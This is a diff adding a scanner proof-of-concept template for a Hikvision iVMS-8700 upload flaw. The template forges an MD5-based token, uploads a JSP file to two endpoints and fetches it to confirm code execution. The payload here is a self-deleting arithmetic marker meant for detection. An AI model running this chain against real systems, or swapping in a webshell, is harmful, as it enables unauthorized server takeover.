@@ -1,0 +1,44 @@
+name: poc-yaml-hivision-ivms-8700-upload-rce
+transport: http
+set:
+  rfilename: randomLowercase(4)
+  s1: randomInt(40000, 44800)
+  s2: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+  scheme: request.url.scheme
+  host: request.url.host
+  eps_path: string("/eps/api/resourceOperations/uploadsecretKeyIbuilding")
+  url: scheme + "://" + host + eps_path
+  token: upper(md5(url))
+rules:
+  r0:
+    request:
+      method: POST
+      path: /eps/api/resourceOperations/upload?token={{token}}
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"fileUploader\"; filename=\"{{rfilename}}.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+    expression: response.status == 200 && response.body_string.contains('"success":true')
+    output:
+      search: >
+        "\"resourceUuid\":\"(?P<filename>[0-9\a-z]+)\",".bsubmatch(response.body)
+      uploadfilename: search["filename"]
+  r1:
+    request:
+      method: POST
+      path: /eps/resourceOperations/upload.action
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        User-Agent: MicroMessenger
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"fileUploader\"; filename=\"{{rfilename}}.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+    expression: response.status == 200 && response.body_string.contains('"success":true')
+    output:
+      search: >
+        "\"resourceUuid\":\"(?P<filename>[0-9\a-z]+)\",".bsubmatch(response.body)
+      uploadfilename: search["filename"]
+  r2:
+    request:
+      method: GET
+      path: /eps/upload/{{uploadfilename}}.jsp
+    expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
+expression: (r0() || r1()) && r2()
